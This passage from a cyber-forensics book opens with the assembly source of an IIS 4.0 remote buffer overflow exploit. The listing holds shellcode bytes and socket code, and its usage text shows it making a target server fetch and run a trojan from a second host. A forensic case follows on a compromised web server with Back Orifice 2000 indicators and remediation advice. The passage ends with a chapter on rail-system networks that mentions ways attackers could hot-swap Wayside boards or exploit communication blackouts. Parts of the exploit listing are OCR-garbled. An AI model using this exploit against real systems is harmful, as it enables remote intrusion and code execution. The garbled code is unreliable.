| db 08bh, || 0d7h, || 089h, || 042h, || 004h, || 052h, || 06ah, || 0l0h, || 052h, || 0ffh, || 077h, || 0cch |
| db 0ffh, || 057h, || 0f 8h, || 05ah, || 066h, || 083h, || 0eeh, || 008h, || 056h, || 043h, || 08bh, || 0f3h |
| db 0fch, || 0ach, || 084h, || 0c0h, || 075h, || 0fbh, || 041h, || 04eh, || 0c7h, || 006h, || 08dh, || 08ah |
| db 08dh, || 08ah, || 081h, || 03 6h, || 080h, || 080h, || 080h, || 080h, || 033h, || 0c0h, || 050h, || 050h |
| db 06ah, || 048h, || 053h, || 0ffh, || 077h, || 0cch, || 0ffh, || 057h, || 0f0h, || 058h, || 05bh, || 08bh |
| db 0d0h, || 066h, || 0b8h, || 0ffh, || 00fh, || 050h, || 052h, || 050h, || 052h, || 0ffh, || 057h, || 0e8h |
| db 08bh, || 0f 0h, || 058h, || 090h, || 090h, || 090h, || 090h, || 050h, || 053h, || 0ffh, || 057h, || 0d4h |
| db 08bh, || 0e8h, || 033h, || 0c0h, || 05ah, || 052h, || 050h, || 052h, || 056h, || 0ffh, || 077h, || 0cch |
| db 0ffh, || 057h, || 0ech, || 080h, || 0fch, || 0ffh, || 074h, || 00fh, || 050h, || 056h, || 055h, || 0ffh |
| db 057h, || 0d8h, || 080h, || 0fch, || 0ffh, || 074h, || 004h, || 085h, || 0c0h, || 075h, || 0dfh, || 055h |
| db 0ffh, || 057h, || 0dch, || 033h, || 0c0h, || 040h, || 050h, || 053h, || 0ffh, || 057h, || 0e4h, || 090h |
| db 090h, || 090h, || 090h, || 0ffh, || 06ch, || 066h, || 073h, || 06fh, || 066h, || 06dh, || 054h, || 053h |
| db 02lh, || 080h, || 08dh, || 084h, || 093h, || 086h, || 082h, || 095h, || 021h, || 080h, || 08dh, || 098h |
| db 093h, || 08ah, || 095h, || 086h, || 021h, || 080h, || 08dh, || 084h, || 08dh, || 090h, || 094h, || 086h |
| db 02lh, || 080h, || 08dh, || 090h, || 091h, || 086h, || 08fh, || 021h, || 078h, || 08ah, || 08fh, || 066h |
| db 099h, || 086h, || 084h, || 021h, || 068h, || 08dh, || 090h, || 083h, || 082h, || 08dh, || 062h, || 08dh |
| db 08dh, || 090h, || 084h, || 021h, || 078h, || 074h, || 070h, || 064h, || 06ch, || 054h, || 053h, || 021h |
| db 093h, || 086h, || 084h, || 097h, || 021h, || 094h, || 086h, || 08fh, || 085h, || 021h, || 094h, || 090h |
| db 084h, || 08ch, || 086h, || 095h, || 021h, || 084h, || 090h, || 08fh, || 08fh, || 086h, || 084h, || 095h |
| db 02lh, || 088h, || 086h, || 095h, || 089h, || 090h, || 094h, || 095h, || 083h, || 09ah, || 08fh, || 082h |
| db 08eh, || 086h, || 021h, || 090h, || 098h, || 08fh, || 04fh, || 086h, || 099h, || 086h, || 021h ||   |

 \_url2 db 85 dup (021h)

 db.”htr HTTP/1.0”

 db 00dh, 00ah, 00dh, 00ah

 logo db “- - - - - (IIS 4.0 remote buffer overflow exploit) - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -,” 13, 10

 db “(c) dark spyrit - barns@eeye.com.,”13,10

 db “http: //[www.eEye.com](http://www.eeye.com), “13,10,13,10

 db “\[usage: iishack <host> <port> <url>\], “ 13, 10

 db “e. g., -

 iishack [www.example.com](http://www.example.com) 80 [www.myserver.com/thetrojan.exe](http://www.myserver.com),”13,10

 db “do not include ‘http://’ before hosts!,”13,10

 db “---------------------------------------------------------------------, “13,10,0

 logolen equ $-logo

 u\_lenght db 10,”No more than 70 chars in 2nd url.,”13,10,0

 u\_lenghtl equ $-u\_length

 errorinit db 10,”Error initializing winsock.,” 13,10,0

 errorinitl equ $-errorinit

 nohost db 10,”No host or IP specified.,” 13,10,0

 nohostl equ $-nohost

 noport db 10,”No port specified.,”13,10,0

 noportl equ $-noport

 no\_url db 10,”No URl specified.,”13,10,0

 no\_url1 equ $-no\_url

 urlinv db 10,”Invalid URL.. no file specified?,”13, 10,0

 urlinvl equ $-urlinv

 reshost db 10,”Error resolving host.,”13,10,0

 reshostl equ $-reshost

 sockerr db 10,”Error creating socket.,”13,10,0

 sockerrl equ $-sockerr

 ipill db 10,”IP error.,”13,10,0

 ipill1 equ $-ipill

 porterr db 10,”Invalid port.,”13,10,0

 porterrl equ $-porterr

 cnerror db 10,”Error establishing connection.,”13,10,0

 cnerrorl equ $-cnerror

 success db 10,”Data sent!,”13,10,0

 successl equ $-success

 console\_in dd?

 console\_out dd?

 bytes\_read dd?

 wsadescription\_len equ 256

 wsasys\_scription\_len equ 256

 wsasys\_status\_len equ 128

 WSAdata struct

 wVersion dw?

 wHighVersion dw?

 szDescription db wsadescription\_len+l dup (?)

 szSystemStatus db wsasys\_status\_len+l dup (?)

 iMaxSockets dw?

 iMaxUdpDg dw?

 lpVendorlnfo dw?

 WSAdata ends

 sockaddr\_in struct

 sin\_family dw?

 sin\_port dw?

 sin\_addr dd?

 sin\_zero db 8 dup (0)

 sockaddr\_in ends

 wsadata WSAdata <?>

 sin sockaddr\_in <?>

 sock dd?

 numbase dd 10

 \_port db 256 dup (?)

 \_host db 256 dup (?)

 \_url db 256 dup (?)

 stuff db 042h, 068h, 066h, 075h, 041b, 050h

 .code

 start:

  call init\_console

  push logolen

  push offset logo

  call write\_console

  call GetCommandLineA

  mov edi, eax

  mov ecx, -1

  xor al, al

  push edi

  not ecx

  pop edi

  mov al, 2Oh

  repnz scasb

  dec ecx

  cmp ch, Offh

  j z @@0

  test ecx, ecx

  jnz @@1

 @@0:

  push nohostl

  push offset nohost

  call write\_console

  jmp quit3

 @@1:

  mov esi, edi

  lea edi, \_host

  call parse

  or ecx, ecx

  jnz *@@2*

  push noportl

  push offset noport

  call write\_console

  jmp quit3

 @@2:

  lea edi, \_port

  call parse

  or ecx, ecx

  jnz @@3

  push no\_urll

  push offset no\_url

  call write\_console

  jmp quit

 @@3

  push ecx

  lea edi, \_url

  call parse

  pop ecx

  cmp ecx, 71

  jb length\_ok

  push u\_lengthl

  push offset u\_length

  call write\_console

  jmp quit3

 length\_ok:

  mov esi, offset \_url

  mov edi, offset \_url2

 @@10:

  xor al, al

  lodsb

  cmp al, 02fh

  jz whaq

  test al, al

  jz @@20

  add al, 02lh

  stosb

  jmp @@10

 @@20:

  push urlinvl

  push offset urlinv

  call write\_console

  jmp quit3

 whaq:

  push esi

  lea esi, stuff

  lodsw

  stosw

  lodsd

  stosd

  pop esi

 fileget:

  xor al, al

  lodsb

  test al, al

  jz getdone

  add al, 02lh

  stosb

  jmp fileget

 getdone:

  push offset wsadata

  push 0l0lh

  call WSAStartup

  or eax, eax

  jz winsock\_found

  push errorinitl

  push offset errorinit

  call write\_console

  jmp quit3

 winsock\_found:

  xor eax, eax

  push eax

  inc eax

  push eax

  inc eax

  push eax

  call socket

  cmp eax, -1

  jnz socket\_ok

  push sockerrl

  push offset sockerr

  call write\_console

  jmp quit2

 socket\_ok:

  mov sock, eax

  mov sin.sin\_family, 2

  mov esi, offset \_port

 Lewp1

  xor al, al

  lodsb

  test al, al

  jz go

  cmp al, 039h

  ja port\_error

  emp al, 03Oh

  jb port\_error

  jmp lewpl

 port\_error:

  push porterrl

  push offset porterr

  call write\_console

  jmp quitl

 go:

  mov ebx, offset \_port

  call str2num

  mov eax, edx

  push eax

  call htons

  mov sin.sin\_port, ax

  mov esi, offset \_host

 lewp:

  xor al, al

  lodsb

  cmp al, 039h

  ja gethost

  test al, al

  jnz lewp

  push offset \_host

  call inet\_addr

  cmp eax, -1

  jnz ip\_aight

  push ipilll

  push offset ipill

  call write\_console

  jmp quitl

 ip\_aight:

  mov sin.sin\_addr, eax

  jmp continue

 gethost:

  push offset \_host

  call gethostbyname

  test eax, eax

  jnz gothost

  push reshostl

  push offset reshost

  call write\_console

  jmp quitl

 gothost:

  mov eax, \[eax+0ch\]

  mov eax, \[eax\]

  mov eax, \[eax\]

  mov sin.sin\_addr, eax

 continue:

  push size sin

  push offset sin

  push sock

  call connect

  or eax, eax

  jz connect\_ok

  push cnerrorl

  push offset cnerror

  call write\_console

  jmp quitl

 connect\_ok

  xor eax, eax

  push eax

  push sploit\_length

  push offset sploit

  push sock

  call send

  push successl

  push offset success

  call write\_console

 quitl

  push sock

  call closesocket

 quit2

  call WSACleanup

 quit3

  push 0

  call ExitProcess

 parse proc

 ;cheap parsing., hell., its only an exploit

 lewp9:

  xor eax, eax

  cld

  lodsb

  cmp al, 2Oh

  jz done

  test al, al

  j z done2

  stosb

  dec ecx

  jmp lewp9

 done:

  dec ecx

 done2:

  ret

 endp

 str2num proc

  push eax ecx edi

  xor eax, eax

  xor ecx, ecx

  xor edx, edx

  xor edi, edi

 lewp2:

  xor al, al

  xlat

  test al, al

  jz end\_it

  sub al, 03Oh

  mov cl, al

  mov eax, edx

  mul numbase

  add eax, ecx

  mov edx, eax

  inc ebx

  inc edi

  cmp edi, Oah

  jnz lewp2

 end\_it;

  pop edi ecx eax

  ret

 endp

 init\_console proc

  push -10

  call GetStdHandle

  or eax, eax

  je init\_error

  mov \[console\_in\], eax

  push -11

  call GetStdHandle

  or eax, eax

  je init\_error

  mov \[console\_out\], eax

  ret

 init\_error:

  push 0

  call ExitProcess

 endp

 write\_console proc text\_out:dword, text\_len:dword

  pusha

  push 0

  push offset bytes\_read

  push text\_len

  push text\_out

  push console\_out

  call WriteConsoleA

  popa

  ret

 endp

** end start**

I have definitely found one major security hole on the web server that has been exploited by hackers. However, I do not stop here, assuming this was the only thing that was done. I continue to look for more. Next, I will use Filter\_I (all four options) on the NT swap file and see what I come up with. The results were as follows:

*   The statement “Suspicious access to SAM “(This is serious. The SAM registry can be hacked. It can mean passwords for the system have been compromised.)
*   Names, conversations, and other data
*   A number of English word statements

I will now use the Text Search Plus program. Based on all the information collected thus far, there is a strong indication that the web server may be remotely controlled by an off-site third party (hacker). This can be done by the IIS4 exploit mentioned above. It can also be done in other ways. Recall that you typed txtsrchp to access this program on drive D. I know from prior experience that B02K (Back Orifice 2000) is a hacker program that can remotely control an NT server. I used keywords such as crtdll.dll, msadp32.acm, and msacm32.dll and searched the slack file Nortelem\_Slack for these files. Sure enough, I found all of them. This indicates that another exploit has also been used against this box – B02K. This is serious. Someone has absolute control of this web server from remote locations. This would also be attributed to the hackers that we found earlier on the system (named above).

Again, I notified the client that this machine was under remote control. I am still waiting to hear whether or not other machines trusted the compromised system. If so, other systems at Nortelem could have had their data altered, copied, stolen, etc. This is quite serious for Nortelem. To find out whether other Nortelem systems are running B02K (and to kill it if they are), their system administrators can do the following:

*   First kill the B02K process running in RAM.
*   Delete all signs of B02K in the registry.
*   Delete any B02K-related files.
*   Reboot the systems.

Word was received from Nortelem that trust relationships involving the compromised web server were set up for a number of internal systems. At the same time, I was also told that Nortelem did not properly document these trust relationships. There was no choice now but to go to each system individually and check them. This will be a time-consuming and tedious job. Corporations should never tie their internal intranet and Internet web server into the same system. Also, trust relationships between systems should be evaluated very carefully before implementing them. If implemented, they should be carefully documented. Using the same search engine/network security sites as before, a search is done on the hacker names found during the analysis phase. It is found that these individuals have hacked into a number of systems in the past. An additional find based on the above information is that common gateway interface (CGI) scripts were written in an insecure manner. This has been a source of major security problems in the past for web servers in general.

In a formal report, the following recommendations were made to Nortelem.

## Recommendations

To recover from B02K and other changes made by hackers:

*   Format drive.
*   Load NT O/S from a trusted source.
*   Load SP6A and the latest release of IIS.
*   Ensure all user accounts are valid.
*   Change all passwords and use strong pass phrases.
*   Load basic website (not the CGI scripts you wrote).
*   Put the basic website on the network.
*   Perform a remote penetration test.
*   If CGI scripts must be on the web server, clean up the CGI scripts and load them back on the server.
*   Perform a second penetration test.
*   Perform a penetration test at least monthly for the rest of the year since this web server is a target.
*   Check other boxes for “infections.”
*   Do not host the intranet and Internet on the same box.
*   Ensure that your virus signatures are up to date and run virus checks on the web server at least once per week.
*   Check the Microsoft website regularly for NT security patches and IIS updates/patches.

### Passwords

Passwords are your first line of defense. They must be strong and yet easy for the end user to type and remember. Passwords should meet the following requirements:

1.  The password should not contain any word used in any dictionary in the world, nor should it be the name of a popular person or machine (radio/television, etc.).
2.  The password should be composed from a pass phrase that the end user makes up. For example, if I make up the phrase “The satellite will launch in 30 minutes,” my password becomes the first character of each word and the numbers I typed. So the above password is tswli30m. This password is easy to remember because the user made up the phrase and it is easy to type. You can also include special characters (such as !, #, or &) if you wish. This type of password is also very difficult to break if a hacker is using a password-cracking program.
3.  The password should be a minimum of eight characters. Even if the hacker is using a password-cracking program on a high-end machine, it will take much, much longer to break an eight-character password than a seven-character password. Most hackers are impatient and will stop the cracking process, moving on to an easier target.
4.  Change passwords every 30 days. As many as 60 days may be used, but doing so increases your exposure. If someone is really focused on breaking into one or more of your systems and is using a very high-end machine to do the processing, allowing 60 days makes it more likely that the hacker will succeed. Trying to do it in 30 days is nearly impossible if strong passwords are used.
5.  System administrators should use password-cracking programs such as L0phtCrack ([https://www.helpnetsecurity.com/2012/09/30/l0phtcrack/](https://www.helpnetsecurity.com)) and John The Ripper ([https://www.openwall.com/john/](https://www.openwall.com)) with NT extensions.

### SAM file

Restricting access to the SAM file is critical. Physically locking up servers is the only way to prevent someone from walking up with a diskette and booting to DOS to obtain the SAM or copying the backup SAM.\_ from the repair folder.

The SYSKEY.SAM encryption enhancement should also be used. SYS-KEY establishes a 128-bit cryptographic password encryption key, rather than the 40-bit key that is provided with the server, and is used by default. It can be configured by selecting Start Menu | Run and typing syskey.

### Intrusion Detection Systems

Intrusion Detection Systems (IDS) should be installed in your network at either the box, subnet, departmental, or enterprise level. I recommend a combination of ISS RealSecure, CMDS, Cisco NetRanger, and Checkpoint

Firewall-1 (or Cisco PIX). I recommend using these four together because the vendors have worked together and all of the products “talk” to one another and interact with one another, and one centralized report can be generated.

### Insecure CGI Scripts

The following websites provide the documents you must review to secure your public web server and write secure CGI scripts:

[http://www.sei.emu.edu/pub/documents/sims/pdf/](http://www.sei.emu.edu) sim011.pdf

This .pdf document states specifically how to secure your public web server. Follow the recommendations. They work. Note the attached html files that deal with writing secure CGI scripts. Also go to the following web pages that deal with writing secure CGI scripts:

*   [http://www.go2net.com/people/paulp/cgi-security](http://www.go2net.com)
*   [http://www.sunworld.com/swol-04-1998/swol-04-security.html](http://www.sunworld.com)
*   [http://www.w3.org/Security/Faq/wwwsf4.html](http://www.w3.org)
*   [http://www.csclub.uwaterloo.ca/u/mlvanbie/cgisec](http://www.csclub.uwaterloo.ca)

### BO/BO2K

BO/BO2K have the following characteristics:

*   BO filenames by default are \[spacel.exe, boserve.exe, boconfig.exe\]
*   BO2K filenames by default are bo2k.exe, bo2kcfg.exe, bo2kgui.exe, UMGR32.EXE, bo\_peep.dll, bo3des.dll.
*   Operates over UDP.
*   The default port is 31337 for BO.
*   The default configuration for BO2K is to listen on TCP port 54320 or UDP 54321, to copy itself to a file called UMGR32. exe in%sys- temroot%, and to install itself as a service called “Remote Administration Service.” These values can be altered by using the bo2kcfg.exe utility that ships with the program.
*   A BO plug-in known as Saran Wrap hides BO within an existing standard InstallShield installer package, making it easier to entice system users to execute it. Another plug-in called Silk Rope links BO with another harmless executable, but one double click launches them both, with a behind-the-scenes installation of BO. Even though it has not been seen yet, a macro virus carrying BO might be coming our way.

The case is now complete. Carefully store all evidence, label it properly, and always maintain chain of custody. Even though the client does not wish to pursue this any further at this time (they now know what was wrong and what to do to correct the problem), in the years to come they might decide to go to court. This means evidence must be kept secured as mentioned. I use mcrypt to encrypt and protect the evidence I have collected.

Nortelem does not wish to pursue this in court because:

*   It gives them publicity they do not want. (Their reputation could be adversely affected.)
*   It could tie up their legal department for a long time.
*   It requires an additional expenditure of funds.

# Chapter 12 Rail transportation

DOI: [10.1201/9781003134817-12](https://doi.org/10.1201/9781003134817-12)

I’ll again point out just what a great leader Alstom (Alstom.com) is for rail transportation in the cybersecurity arena. We take a look at some of their products below but you should also take a look at their excellent whitepaper here: [https://www.alstom.com/sites/alstom.com/files/2020/09/15/Whitepaper%20Cybersecurity.pdf](https://www.alstom.com)

Let me first point out that, due to the historical use of the terminology, there is a debate that has not yet finished as to when to use the term Industrial Control System (ICS) and Supervisory Control and Data Acquisition (SCADA). Now if you have been working in the industrial automation field for several decades, it’s more cut and dried for you. However, it’s not just industry professionals I’m talking with here. Some would say that SCADA is a subset of ICS. However, to the public in general, to various government officials sitting on committees, and to the press (online, newspapers, magazines, radio, television), the term SCADA is well known and used. That being the case, I’m going to stick to the use of the term SCADA here.

Rail systems are essentially a rolling SCADA system (the train itself) in communications with Wayside equipment (equipment that resides external to the train itself housed inside “equipment boxes” we call Bungalows, and elsewhere alongside the railroad tracks … secured by cameras, etc.), Rail control centers (RCC) where train monitoring and control takes place, satellites, and cell towers. We could go into more items/details here but this will suffice for cyber forensics usage.

I also want to mention the terms Information Technology (IT) and Operational Technology (OT). OT refers to computer networks/systems that manage ICS/SCADA systems whereas IT refers to computer networks/systems that operate in a business/administrative capacity. I would say that a major way to tell IT and OT apart is that if an IT server/computer/system has a problem then it may just require a reboot or a patch but if an OT server/computer/system has a problem then you cannot just “reboot” or “patch” … and the result can be human lives lost, explosions in a factory, nuclear facility disaster if the cooling system fails (one example), contamination of the public water supply in a waste water treatment plant or a derailed train. Rail systems encompass both IT and OT networks depending on which part of the complete system you are currently focused on. You can also bring into play here the term Internet of Things (IoT) because rail systems are also embedded with IoT devices. IoT devices are physical hardware/software entities (sensors for example) that tie into the Internet for monitoring, controlling and the exchange of data.

Let’s move forward now and learn some pertinent items pertaining to rail industry devices and networks since I’m sure most of you are most likely do not have a background in this arena. So, what are some examples of electronic devices tied into a rail system network? Here is a partial listing:

*   Closed circuit television (CCTV)
*   Building automation
*   Wi-Fi
*   Human machine interface (HMI)
*   Access Control Systems (ACS)
*   Kiosks for information purposes (and more)
*   Voice Radio Systems
*   Security Gateway (SGW)
*   Passenger counting system (PCS)
*   E-mail, printers, file sharing, and more
*   Telephones/Intercom
*   Public Announcement & Customer Information System (PACIS)
*   Parking management
*   Fare/Ticketing systems
*   Vehicle maintenance
*   Video conferencing
*   Global Positioning System (GPS)
*   Train Control Management System (TCMS)
*   Digital Signage
*   Remote control of trains in a rail yard (and yes this has been hacked by malicious actors in the past … more on this later)
*   Firewall (FW)

As you can see from the list above, much of what we covered in prior chapters of this book is the same type of items in a normal business network, and as such the same cyber forensic processes/procedures/tools can be applied for a number of those items (not everything of course … more on that later). That’s good news for cyber forensics investigators/analysts. And yes, all of the abovementioned items have been hacked by malicious actors in the past, including the remote control of trains in a rail yard via a man-in-the-middle attack … and that attack was successful due to a weakness in the communications protocol being used.

Let’s start our networking discussion from a 50,000-foot view … very high level. Some of what you learn here is elaborated on elsewhere in this book and some of it, if you are interested, will require you to perform some Internet research. Also keep in mind that if you are reading something in this section and you say to yourself, where did that come from, or, what is he talking about … that tells you either you missed something in this book where I did elaborate on the item or you need to do some additional Internet research yourself.

Notice first that rail system networks are broken down by zones, from most trusted to least trusted (this is shown in the diagram below). As you can see, rail systems use ethernet networks, so whatever vulnerabilities and strong points you attribute to ethernet … you will find them on rail networks. SGW stands for Security Gateway, and many times this is a NetBox device which includes firewalls, Intrusion Detection System (IDS), etc. Note that all automatic train control (ATC) equipment lies behind the security gateway (note that TCMS and ATC exchange a significant amount of information). ATP and PTU also exchange information. TCMS and ATC communicate via an FPGA.

![](images/inline12.1.jpg)

I’ll be using some terminology that I won’t fully explain here but as a reference use this site:

*   [https://trn.trains.com/railroads/abcs-of-railroading/2006/05/glossary-of-railroad-signal-terms](https://trn.trains.com)

A glossary of North American railway terms can be found at:

*   [https://en.wikipedia.org/wiki/Glossary\_of\_North\_American\_railway\_terms](https://en.wikipedia.org)

A key provider to the rail industry for onboard Space & Terrestrial Communications (S&TC) is a company called Atlas ([https://atlas-comms.com/](https://atlas-comms.com)).

What are some of the server types we see in a rail network? Let’s take a look (again, much of it is common to what you see in a standard IT network):

*   Severs with a cyber security bent 
    *   AD/PKI
    *   NMS
    *   DMS
    *   EPO
    *   Syslog
    *   Bastion
    *   SIEM
    *   GTW web/OPC
    *   IDS/WIPS
*   GTCS servers 
    *   CS
    *   MS
    *   FEP IXL USRC
    *   SCADA
    *   FEP SCADA
    *   Playback server
    *   Simulation and training
*   ISM Servers 
    *   PA
    *   CCTV
    *   PIS
*   Maintenance servers 
    *   FCS server
    *   EMS server
    *   Event recorder
    *   PHM server

Do we have a Demilitarized Zone (DMZ) in a rail network? Yes we do….

Do we have a Storage Area Network (SAN)? Yes we do…

Items that reside on the train itself and at the Wayside tie back to the main control center either via the Internet (much of the time but not always), leased lines, fiber, dedicated networks, RF radio via dedicated frequencies, cell towers, and satellites (we will discuss relevant satellite information elsewhere in this book). Let’s also discuss here some other terminology and the names of some relevant train control products from various manufacturers.

Communication-Based Train Control (CBTC)

*   Enhances safety and operation
*   Lower cost of energy (optimizes coasting time, braking, acceleration, etc.)
*   [https://en.wikipedia.org/wiki/Communications-based\_train\_control](https://en.wikipedia.org)

Interlockings

*   Tracks that cross over one another
*   Signaling is what makes a train wait its turn
*   ElectroCode is sent along the track via direct current (DC)
*   VHLC is legacy and ElectrologIXS VLC is the future (and being used for all new developments) 
    *   ElectrologIXS can be hooked into via a laptop and mobile device (uses a web GUI interface). ElectrologIXS can also be setup to handle crossing control.

Positive Train Control (PTC)

*   A layer of protection that was made a legal requirement after a train engineer was busy texting on his phone, not paying attention, and caused a serious train accident.
*   Forces red light stop.
*   Can be wireless or cabled or a combination; rail companies such as CSX and BNSF (both cutting edge tech companies) run fiber to the Wayside for this and other things.
*   Wireless communications between the Wayside and the train usually involve HMAC authentication and OTA encryption.
*   When PTC first began, cell phones were placed inside the Wayside for wireless communications but nowadays ethernet is used; You can hook a laptop up to a Wayside now via an ethernet cable (password protected of course along with other security-related items).
*   Ethernet is used to connect ElectroBlox to the PTC processor.

Ultra-Cab II

*   An onboard system (onboard meaning that it sits on the train itself)
*   Enforces speeds and prevents collisions
*   Automatic train protection (ATP) – a subset of automatic train control (ATC)
*   Enforces speed limit 
    *   Informs train operator and if the train operator does nothing then it automatically stops the train as needed
*   Helps to prevent train collisions and derailments

ITCS

*   An onboard system (onboard meaning that it sits on the train itself)
*   Will stop the train if necessary
*   Speed enforcement
*   Makes use of wayside devices
*   Prevents train collisions and derailments
*   GPS technology and makes use of cell towers
*   There is an ITCS server on the network

RailEdge (software package used for rail traffic management … similar to air traffic control)

*   Used inside railway control centers
*   No safety critical items
*   Runs on Windows and Linux
*   Features are turned on/off depending on what the customer wants
*   Tracks where trains are going and prioritize routes taken for both freight and passenger trains
*   Central location for data – decision making
*   Data comes in real time from waysides, etc.
*   2 products 
    *   TC/SCADA (TC = Train Control) 
        *   – ICONIS
    *   PACIS (similar to ISM) 
        *   – Next train coming signs
        *   – Public announcement
*   Passenger information in real time
*   Interfaces into the DC track circuit via ethernet or serial (Genesys protocol allows ethernet over serial. Genesys is an open protocol.)
*   RailEdge can tie into the ElectrologIXS box and ask it to move the tracks in various ways. If the request is considered unsafe then the Wayside will say “no.” Wayside’s can talk to each other via Edge Message Protocol (EMP). Vital communication protocols exist, such as RP2000, which is a proprietary serial/ethernet protocol. Vital and non-vital communications exist on a rail network. For Vital communications (True is greater than 8 volts and False is less than 3 volts), used for security and safety, means that two branches must see the exact same communications and if they do not then the command given is not executed. Note that the protocol RP2009 is an HMAC wrapper. There are other protocols in use on rail networks also, such as ATCS (old and open but still used), ARES, FSFB2, ERTMS (Europe), MODBUS (used where non-vital data is in place, along with data being sent back to the main office), etc.

Switch machines

*   Hydra – not Vital apps
*   CTS2 – Vital applications
*   Eliminates delays
*   Enables less congestion
*   Sold as a flow product
*   Can tie into RailEdge and other software products (just need the protocols to agree)
*   Improves railyard efficiency

Wireless crossing

*   A rail crossing where signaling is performed via wireless communications

Major rail systems in the United Kingdom

*   Network Rail
*   London Underground
*   Crossrail (in London)

Riyadh, Saudi Arabia has the world’s largest Metro (public transit system – [http://riyadhmetro.sa/en/](http://riyadhmetro.sa)). This was a $23B, five-year project and has six rail lines. It is driverless and built with the latest CBTC technology. Riyadh Metro project is composed of six main lines with an overall length of 176 km (approximately 110 miles) and 85 stations. Riyadh Metro network comprises most of the highly populated districts, government’s facilities, educational and commercial entities. Urbanlis signaling in conjunction with a HESOP breaking energy-recovery system is in use. An automated track laying system called Appitrack was also utilized.

Hot swappable boards are liked by terrorists and other malicious actors. All it takes for a malicious act is for the malicious actor to bribe someone for a code change, bring down the Wayside for 30 seconds and they hot-swap in another board that has most of the same electronics … and something extra. That’s bad news of course. Note that Wayside communications can be used to shut down a running train, and the only way that a Wayside can communicate with a running train is via either ITCS or PTC … 220 HZ radio, SatCom or cell tower. Note that many Waysides contain modems (a modem card running between 300 Baud and 19.2). Something else malicious actor’s like is what is called “Dark Territory” (DT). DTs are locations trains travel during which there is essentially a communications blackout. During these blackouts, a malicious actor could physically (or electronically) do something malicious to a train that may not be discovered until it’s too late (think about attacking an explosive device to a chemical car on a train that is headed for a populated area).

Embedded systems are used to automate trains (usually ARM/ColdFire processors). One of the ways rail products are tested for security is via the use of a tool called Achilles from a company called Wurldtech (purchased by GE; [https://nohau.eu/products/achilles-test-platform/](https://nohau.eu)). When it comes to rail product testing, usually Lab View from National Instruments is used ([https://www.ni.com/getting-started/labview-basics/](https://www.ni.com)). Analog signals on rail run around 100 HZ since high frequencies don’t go very far.

I suppose one could say that the real problem with cyber security is that many times you can’t tell, with even 80% accuracy, just who it specifically was that performed the malicious act. We need to be able to quickly and easily determine who specifically performed the malicious action. Being able to do this globally, in conjunction with globally agreed upon cyber laws relative to restitution, would significantly reduce cyberattacks since the perpetrators would no longer be anonymous.

CENELEC ([https://www.cenelec.eu/](https://www.cenelec.eu)) is a European standard within the rail industry.

The rail industry follows standards/guidelines from an organization called American Public Transportation Association (APTA; [https://www.apta.com/](https://www.apta.com)). Key documents from APTA that are relevant to cyber forensics are as follows:

*   SS – CCS – RP – 001 – 10 
    *   Securing Control and Communication Systems
    *   Risk Assessment and Management
    *   Security Plan
    *   This is a very high-level document
*   SS – CCS – RP – 002 – 13 
    *   Defense in Depth
    *   Risk Zones
    *   Minimum Controls for Safety Critical Zones
    *   Applying Security Controls to Zones
*   SS – CC – 03 – 15 
    *   Attack Modeling
    *   Attack Tree Analysis
*   SS – CCS – 004 – 16 
    *   System Level Security
    *   Connecting Security Zones
*   SS – ECS – RP – 001 – 14 
    *   High Level: Governance, Landscape, Peril

A few NIST documents that are relevant to us are:

*   800-82 Rev 2 
    *   ICS Security (SCADA)
    *   Quite detailed
*   800-88 
    *   Sanitization

Why is it that many railroads avoid “security automation” tools to a degree? It’s because in numerous arenas, the security automation that was supposed to help the organization (and it did for a time) ended up being the very thing compromised by malicious actors, much to the chagrin of the organizations opting for security automation. So, what do we do…throw the baby out with the bathwater? No! Security automation to a degree is fine, but don’t let it be your end all and be all. Break up the security automation with some “manual portions” …items where you have to actually get up out of your seat and do something to make the process continue. Yes, it does adversely impact efficiency, but on the other hand it gives you control of that automated security process that was put into place. Even if a malicious actor gains control of your security automation capability, it only carries them so far. Once they encounter the manual breaks that require someone to actually get up and do something…the hackers are stuck, and can proceed no further until one or more manual steps are performed, and they would need the right inside person to carry out those steps. An example (and this is just an example, use your imagination to come up with ideas of your own) of a manual step would be someone has to get up, place a DVD into a system, let the software on the DVD activate, which then allows the process to continue. The DVD is removed from the system and placed in a secure location when not being used. It is not left in that system. There should be at least two manual breaks in your security automation.

Virtual signaling is considered a newer method of train control (note VPM-3 executive software which is for virtual signaling; note that ITCS virtual signaling is in place today) and the rail industry is now moving into Predictive Analytics for diagnostics/maintenance activities. Pulsed Amplitude Modulation (PAM) is used in the rail industry and has eight different amplitude levels to communicate 3 bits per symbol. So, a 45-bit message can be transmitted with 15 symbols in approximately 800 msec. These signals can be transmitted at either baseband (DC) or carrier frequency (45 Hz +/- 15 Hz, so 30 to 60 Hz). Matched filter processing at the receiver ensures the signal has the expected shape, which provides additional security from electromagnetic interference (EMI) or other malicious acts.

WSDMM

*   A device that collects/connects Wayside data

DAU

*   A Wayside sensor

ATC

*   Automatic Train Control 
    *   Note that ATC has three subsystems 
        *   – ATP = Automatic Train Protection
        *   – ATO = Automatic Train Operation
        *   – ATS = Automatic Train Supervision
*   For some rail networks, ATC is based on AccuTrack high frequency track circuit
*   ATC is essentially deals with communication with train operations via cab signals and Wayside signals

Infrared, magnetometers, and/or lidar/radar are used in island detection at railroad crossings in some locations. This is relatively new. From a forensics standpoint, it could well be that your background does not include thorough knowledge of railroad products that may fall into your line of investigation. You have the options of Internet research (which may or may not be successful), finding and interviewing someone who does know the railroad products of interest, or you can just consider the rail product a black box and focus on the inputs and outputs. Either of the three options can work for you, depending on the situation at hand.

Although it makes the rail network more vulnerable from a security perspective, most network engineers nowadays opt for ethernet instead of serial cables because it gives them more connectivity options and of course the system management benefits. Some rail entities are also using cloud technology now, usually Microsoft Azure. Not all, but some Wayside’s now have a network appliance inside the bungalow that monitors critical components and provides easily accessible logs for incident analysis (so it’s to this type of device you want to go to at the Wayside during a forensics investigation if it exists there). Also, some railways are looking to stream all of their logs 24/7, so look into that also. Rail systems are getting more and more into Big Data Analytics and Predictive Analytics for maintenance purposes, so that is another avenue you need to look into to see if it exists during an investigation. Make a search for XTS files also since these are in use for Wayside scripts, etc. ([https://www.datacamp.com/community/blog/r-xts-cheat-sheet](https://www.datacamp.com)). During the design process, rail product engineers make use of ladder logic equations, so you’ll want to look into this also ([https://www.plcacademy.com/ladder-logic-tutorial/](https://www.plcacademy.com)).

Centralized Traffic Control (CTC) uses the ATCS, ARES and Genesys communication protocols. The goal is to use the PTC communications infrastructure for CTC.

*   [https://docs.genesys.com/Documentation/OU/8.1.5/Ref/CommunicationProtocols](https://docs.genesys.com)
